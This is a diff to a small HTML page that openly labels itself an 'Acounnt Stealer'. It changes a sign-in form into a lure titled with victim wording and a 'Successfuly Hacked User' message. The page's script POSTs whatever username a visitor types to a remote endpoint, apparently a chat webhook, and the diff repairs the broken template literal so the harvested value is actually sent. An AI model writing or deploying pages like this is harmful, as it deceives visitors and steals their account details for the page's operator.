@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login</title>
+    <title>Dray001 Acounnt Stealer</title>
 
     <style>
         body {
@@ -84,13 +84,13 @@
 <body>
 
     <div class="container">
-        <h2>Sign In</h2>
+        <h2>Victims profile code</h2>
 
         <input type="text" id="username" placeholder="Username">
 
         <button onclick="sendData()">Continue</button>
 
-        <p class="success" id="msg">Sent!</p>
+        <p class="success" id="msg">Successfuly Hacked User</p>
     </div>
 
     <script>
@@ -104,7 +104,7 @@
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    content: `New username submitted: **${victims profile code}**`
+                    content: `New username submitted: **${username}**`
                 })
             })
             .then(() => {
@@ -116,4 +116,5 @@
 
 </body>
 </html>
+
 
